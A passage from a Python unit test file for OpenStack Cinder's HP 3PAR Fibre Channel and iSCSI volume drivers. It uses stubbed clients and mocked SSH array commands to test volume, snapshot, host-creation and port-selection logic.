    def fake_get_volume_type(self, type_id):
        return self.volume_type

    def fake_get_qos_by_volume_type(self, volume_type):
        return self.QOS

    def fake_add_volume_to_volume_set(self, volume, volume_name,
                                      cpg, vvs_name, qos):
        return volume

    def fake_copy_volume(self, src_name, dest_name, cpg=None,
                         snap_cpg=None, tpvv=True):
        pass

    def fake_get_volume_stats(self, vol_name):
        return ""normal""

    def fake_get_volume_settings_from_type(self, volume):
        return {'cpg': HP3PAR_CPG,
                'snap_cpg': HP3PAR_CPG_SNAP,
                'vvs_name': self.VVS_NAME,
                'qos': self.QOS,
                'tpvv': True,
                'volume_type': self.volume_type}

    def fake_get_volume_settings_from_type_noqos(self, volume):
        return {'cpg': HP3PAR_CPG,
                'snap_cpg': HP3PAR_CPG_SNAP,
                'vvs_name': None,
                'qos': None,
                'tpvv': True,
                'volume_type': None}

    def test_create_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type_noqos)
        self.driver.create_volume(self.volume)
        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)

    def test_create_volume_qos(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_add_volume_to_volume_set"",
                       self.fake_add_volume_to_volume_set)
        self.driver.create_volume(self.volume_qos)
        volume = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)

        self.assertEqual(volume['name'], self.VOLUME_3PAR_NAME)
        self.assertNotIn(self.QOS, dict(ast.literal_eval(volume['comment'])))

    def test_delete_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.driver.delete_volume(self.volume)
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVolume,
                          self.VOLUME_ID)

    def test_create_cloned_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""get_volume_settings_from_type"",
                       self.fake_get_volume_settings_from_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_copy_volume"",
                       self.fake_copy_volume)
        volume = {'name': HP3PARBaseDriver.VOLUME_NAME,
                  'id': HP3PARBaseDriver.CLONE_ID,
                  'display_name': 'Foo Volume',
                  'size': 2,
                  'host': HP3PARBaseDriver.FAKE_HOST,
                  'source_volid': HP3PARBaseDriver.VOLUME_ID}
        src_vref = {}
        model_update = self.driver.create_cloned_volume(volume, src_vref)
        self.assertTrue(model_update is not None)

    def test_create_snapshot(self):
        self.flags(lock_path=self.tempdir)
        self.driver.create_snapshot(self.snapshot)

        # check to see if the snapshot was created
        snap_vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.SNAPSHOT_3PAR_NAME)

    def test_delete_snapshot(self):
        self.flags(lock_path=self.tempdir)

        self.driver.create_snapshot(self.snapshot)
        #make sure it exists first
        vol = self.driver.common.client.getVolume(self.SNAPSHOT_3PAR_NAME)
        self.assertEqual(vol['name'], self.SNAPSHOT_3PAR_NAME)
        self.driver.delete_snapshot(self.snapshot)

        # the snapshot should be deleted now
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVolume,
                          self.SNAPSHOT_3PAR_NAME)

    def test_create_volume_from_snapshot(self):
        self.flags(lock_path=self.tempdir)
        self.driver.create_volume_from_snapshot(self.volume, self.snapshot)

        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)

        volume = self.volume.copy()
        volume['size'] = 1
        self.assertRaises(exception.InvalidInput,
                          self.driver.create_volume_from_snapshot,
                          volume, self.snapshot)

    def test_create_volume_from_snapshot_qos(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_get_volume_type"",
                       self.fake_get_volume_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_get_qos_by_volume_type"",
                       self.fake_get_qos_by_volume_type)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon,
                       ""_add_volume_to_volume_set"",
                       self.fake_add_volume_to_volume_set)
        self.driver.create_volume_from_snapshot(self.volume_qos, self.snapshot)
        snap_vol = self.driver.common.client.getVolume(self.VOLUME_3PAR_NAME)
        self.assertEqual(snap_vol['name'], self.VOLUME_3PAR_NAME)
        self.assertNotIn(self.QOS, dict(ast.literal_eval(snap_vol['comment'])))

        volume = self.volume.copy()
        volume['size'] = 1
        self.assertRaises(exception.InvalidInput,
                          self.driver.create_volume_from_snapshot,
                          volume, self.snapshot)

    def test_terminate_connection(self):
        self.flags(lock_path=self.tempdir)
        #setup the connections
        self.driver.initialize_connection(self.volume, self.connector)
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)
        self.assertEqual(vlun['volumeName'], self.VOLUME_3PAR_NAME)
        self.driver.terminate_connection(self.volume, self.connector,
                                         force=True)
        # vlun should be gone.
        self.assertRaises(hpexceptions.HTTPNotFound,
                          self.driver.common.client.getVLUN,
                          self.VOLUME_3PAR_NAME)

    def test_extend_volume(self):
        self.flags(lock_path=self.tempdir)
        self.stubs.UnsetAll()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""extend_volume"",
                       self.fake_extend_volume)
        option = {'comment': '', 'snapCPG': HP3PAR_CPG_SNAP}
        self.driver.common.client.createVolume(self.volume['name'],
                                               HP3PAR_CPG,
                                               self.volume['size'],
                                               option)
        old_size = self.volume['size']
        volume = self.driver.common.client.getVolume(self.volume['name'])
        self.driver.extend_volume(volume, str(old_size + 1))
        vol = self.driver.common.client.getVolume(self.volume['name'])
        self.assertEqual(vol['sizeMiB'], str(old_size + 1))


class TestHP3PARFCDriver(HP3PARBaseDriver, test.TestCase):

    _hosts = {}

    def setUp(self):
        self.tempdir = tempfile.mkdtemp()
        super(TestHP3PARFCDriver, self).setUp()
        self.setup_driver(self.setup_configuration())
        self.setup_fakes()

    def setup_fakes(self):
        super(TestHP3PARFCDriver, self).setup_fakes()
        self.stubs.Set(hpfcdriver.HP3PARFCDriver,
                       ""_create_3par_fibrechan_host"",
                       self.fake_create_3par_fibrechan_host)

    def tearDown(self):
        shutil.rmtree(self.tempdir)
        super(TestHP3PARFCDriver, self).tearDown()

    def setup_driver(self, configuration):
        self.driver = hpfcdriver.HP3PARFCDriver(configuration=configuration)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.driver.do_setup(None)

    def fake_create_3par_fibrechan_host(self, hostname, wwn,
                                        domain, persona_id):
        host = {'FCPaths': [{'driverVersion': None,
                             'firmwareVersion': None,
                             'hostSpeed': 0,
                             'model': None,
                             'portPos': {'cardPort': 1, 'node': 1,
                                         'slot': 2},
                             'vendor': None,
                             'wwn': wwn[0]},
                            {'driverVersion': None,
                             'firmwareVersion': None,
                             'hostSpeed': 0,
                             'model': None,
                             'portPos': {'cardPort': 1, 'node': 0,
                                         'slot': 2},
                             'vendor': None,
                             'wwn': wwn[1]}],
                'descriptors': None,
                'domain': domain,
                'iSCSIPaths': [],
                'id': 11,
                'name': hostname}
        self._hosts[hostname] = host
        self.properties = {'data':
                          {'target_discovered': True,
                           'target_lun': 186,
                           'target_portal': '1.1.1.2:1234'},
                           'driver_volume_type': 'fibre_channel'}
        return hostname

    def test_initialize_connection(self):
        self.flags(lock_path=self.tempdir)
        result = self.driver.initialize_connection(self.volume, self.connector)
        self.assertEqual(result['driver_volume_type'], 'fibre_channel')

        # we should have a host and a vlun now.
        host = self.fake_get_3par_host(self.FAKE_HOST)
        self.assertEquals(self.FAKE_HOST, host['name'])
        self.assertEquals(HP3PAR_DOMAIN, host['domain'])
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)

        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])
        self.assertEquals(self.FAKE_HOST, vlun['hostname'])

    def test_get_volume_stats(self):
        self.flags(lock_path=self.tempdir)

        def fake_safe_get(*args):
            return ""HP3PARFCDriver""

        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'FC')
        self.assertEquals(stats['total_capacity_gb'], 'infinite')
        self.assertEquals(stats['free_capacity_gb'], 'infinite')

        #modify the CPG to have a limit
        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)
        options = {'SDGrowth': {'limitMiB': 8192}}
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, options)

        const = 0.0009765625
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'FC')
        total_capacity_gb = 8192 * const
        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)
        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)
        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, {})

    def test_create_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpfcdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost', '123456789012345',
                            '123456789054321'])
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_create_invalid_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost', '123456789012345',
                            '123456789054321'])
        create_host_ret = pack(CLI_CR +
                               'already used by host fakehost.foo (19)')
        _run_ssh(create_host_cmd, False).AndReturn([create_host_ret, ''])

        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']
        _run_ssh(show_3par_cmd, False).AndReturn([pack(FC_SHOWHOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)

        self.assertEquals(host['name'], 'fakehost.foo')

    def test_create_modify_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(NO_FC_HOST_RET), ''])

        create_host_cmd = ['createhost', '-add', 'fakehost', '123456789012345',
                           '123456789054321']
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(FC_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)


class TestHP3PARISCSIDriver(HP3PARBaseDriver, test.TestCase):

    TARGET_IQN = ""iqn.2000-05.com.3pardata:21810002ac00383d""

    _hosts = {}

    def setUp(self):
        self.tempdir = tempfile.mkdtemp()
        super(TestHP3PARISCSIDriver, self).setUp()
        self.setup_driver(self.setup_configuration())
        self.setup_fakes()

    def setup_fakes(self):
        super(TestHP3PARISCSIDriver, self).setup_fakes()

        self.stubs.Set(hpdriver.HP3PARISCSIDriver, ""_create_3par_iscsi_host"",
                       self.fake_create_3par_iscsi_host)

        #target_iqn = 'iqn.2000-05.com.3pardata:21810002ac00383d'
        self.properties = {'data':
                          {'target_discovered': True,
                           'target_iqn': self.TARGET_IQN,
                           'target_lun': 186,
                           'target_portal': '1.1.1.2:1234'},
                           'driver_volume_type': 'iscsi'}

    def tearDown(self):
        shutil.rmtree(self.tempdir)
        self._hosts = {}
        super(TestHP3PARISCSIDriver, self).tearDown()

    def setup_driver(self, configuration, set_up_fakes=True):
        self.driver = hpdriver.HP3PARISCSIDriver(configuration=configuration)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)

        if set_up_fakes:
            self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_ports"",
                           self.fake_get_ports)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.driver.do_setup(None)

    def fake_create_3par_iscsi_host(self, hostname, iscsi_iqn,
                                    domain, persona_id):
        host = {'FCPaths': [],
                'descriptors': None,
                'domain': domain,
                'iSCSIPaths': [{'driverVersion': None,
                                'firmwareVersion': None,
                                'hostSpeed': 0,
                                'ipAddr': '10.10.221.59',
                                'model': None,
                                'name': iscsi_iqn,
                                'portPos': {'cardPort': 1, 'node': 1,
                                            'slot': 8},
                                'vendor': None}],
                'id': 11,
                'name': hostname}
        self._hosts[hostname] = host
        return hostname

    def test_initialize_connection(self):
        self.flags(lock_path=self.tempdir)
        result = self.driver.initialize_connection(self.volume, self.connector)
        self.assertEqual(result['driver_volume_type'], 'iscsi')
        self.assertEqual(result['data']['target_iqn'],
                         self.properties['data']['target_iqn'])
        self.assertEqual(result['data']['target_portal'],
                         self.properties['data']['target_portal'])
        self.assertEqual(result['data']['target_discovered'],
                         self.properties['data']['target_discovered'])

        # we should have a host and a vlun now.
        host = self.fake_get_3par_host(self.FAKE_HOST)
        self.assertEquals(self.FAKE_HOST, host['name'])
        self.assertEquals(HP3PAR_DOMAIN, host['domain'])
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)

        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])
        self.assertEquals(self.FAKE_HOST, vlun['hostname'])

    def test_get_volume_stats(self):
        self.flags(lock_path=self.tempdir)

        def fake_safe_get(*args):
            return ""HP3PARFCDriver""

        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'iSCSI')
        self.assertEquals(stats['total_capacity_gb'], 'infinite')
        self.assertEquals(stats['free_capacity_gb'], 'infinite')

        #modify the CPG to have a limit
        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)
        options = {'SDGrowth': {'limitMiB': 8192}}
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, options)

        const = 0.0009765625
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'iSCSI')
        total_capacity_gb = 8192 * const
        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)
        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)
        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, {})

    def test_create_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost',
                            'iqn.1993-08.org.debian:01:222'])
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_create_invalid_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',
                           ('OpenStack',), 'fakehost',
                            'iqn.1993-08.org.debian:01:222'])
        in_use_ret = pack('\r\nalready used by host fakehost.foo ')
        _run_ssh(create_host_cmd, False).AndReturn([in_use_ret, ''])

        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']
        _run_ssh(show_3par_cmd, False).AndReturn([pack(ISCSI_3PAR_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)

        self.assertEquals(host['name'], 'fakehost.foo')

    def test_create_modify_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_NO_HOST_RET), ''])

        create_host_cmd = ['createhost', '-iscsi', '-add', 'fakehost',
                           'iqn.1993-08.org.debian:01:222']
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])
        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_get_ports(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI),
                                                    ''])
        self.mox.ReplayAll()

        ports = self.driver.common.get_ports()
        self.assertEqual(ports['FC'][0], '20210002AC00383D')
        self.assertEqual(ports['iSCSI']['10.10.120.252']['nsp'], '0:8:2')

    def test_get_iscsi_ip_active(self):
        self.flags(lock_path=self.tempdir)

        #record set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        self.mox.ReplayAll()

        config = self.setup_configuration()
        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']
        self.setup_driver(config, set_up_fakes=False)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN), ''])

        self.mox.ReplayAll()

        ip = self.driver._get_iscsi_ip('fakehost')
        self.assertEqual(ip, '10.10.220.253')

    def test_get_iscsi_ip(self):
        self.flags(lock_path=self.tempdir)

        #record driver set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        #record
        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']
        show_vlun_ret = 'no vluns listed\r\n'
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(show_vlun_ret), ''])
        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])

        self.mox.ReplayAll()

        config = self.setup_configuration()
        config.iscsi_ip_address = '10.10.10.10'
        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']
        self.setup_driver(config, set_up_fakes=False)

        ip = self.driver._get_iscsi_ip('fakehost')
        self.assertEqual(ip, '10.10.220.252')

    def test_invalid_iscsi_ip(self):
        self.flags(lock_path=self.tempdir)

        #record driver set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        config = self.setup_configuration()
        config.hp3par_iscsi_ips = ['10.10.220.250', '10.10.220.251']
        config.iscsi_ip_address = '10.10.10.10'
        self.mox.ReplayAll()

        # no valid ip addr should be configured.
        self.assertRaises(exception.InvalidInput,
                          self.setup_driver,
                          config,
                          set_up_fakes=False)

    def test_get_least_used_nsp(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])

        self.mox.ReplayAll()
        # in use count                           11       12
        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:8:1'])
        self.assertEqual(nsp, '0:2:1')

        # in use count                            11       10
        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:2:1'])
        self.assertEqual(nsp, '1:2:1')

        # in use count                            0       10
        nsp = self.driver._get_least_used_nsp(['1:1:1', '1:2:1'])
        self.assertEqual(nsp, '1:1:1')


def pack(arg):
    header = '\r\n\r\n\r\n\r\n\r\n'
    footer = '\r\n\r\n\r\n'
    return header + arg + footer

FC_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost,Generic,50014380242B8B4C,0:2:1,n/a\r\n'
    '75,fakehost,Generic,50014380242B8B4E,---,n/a\r\n'
    '75,fakehost,Generic,1000843497F90711,0:2:1,n/a \r\n'
    '75,fakehost,Generic,1000843497F90715,1:2:1,n/a\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

FC_SHOWHOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost.foo,Generic,50014380242B8B4C,0:2:1,n/a\r\n'
    '75,fakehost.foo,Generic,50014380242B8B4E,---,n/a\r\n'
    '75,fakehost.foo,Generic,1000843497F90711,0:2:1,n/a \r\n'
    '75,fakehost.foo,Generic,1000843497F90715,1:2:1,n/a\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost.foo,--,--\r\n'
    '\r\n'
    '---------- Host fakehost.foo ----------\r\n'
    'Name       : fakehost.foo\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

NO_FC_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost,Generic,iqn.1993-08.org.debian:01:222,---,10.10.222.12\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_NO_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_PORT_IDS_RET = (
    'N:S:P,-Node_WWN/IPAddr-,-----------Port_WWN/iSCSI_Name-----------\r\n'
    '0:2:1,28210002AC00383D,20210002AC00383D\r\n'
